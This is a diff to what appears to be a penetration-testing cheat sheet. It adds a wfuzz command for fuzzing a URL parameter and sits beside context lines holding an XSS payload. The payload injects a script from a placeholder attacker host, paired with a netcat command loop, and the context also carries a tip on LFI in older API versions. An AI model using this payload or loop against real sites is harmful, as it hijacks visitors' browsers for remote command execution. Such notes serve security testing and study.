@@ -190,6 +190,10 @@ Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; do
 Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
 ```
 
+### Wfuzz
+
+`wfuzz -c -z file,wordlist.txt --hh=0  http://<ip>/<path>/?date=FUZZ`
+
 ### API (Applicaton Programmable Interface)
 
 * Check for possibility if there is a v1 , it is likely to be vulnerable to LFI 
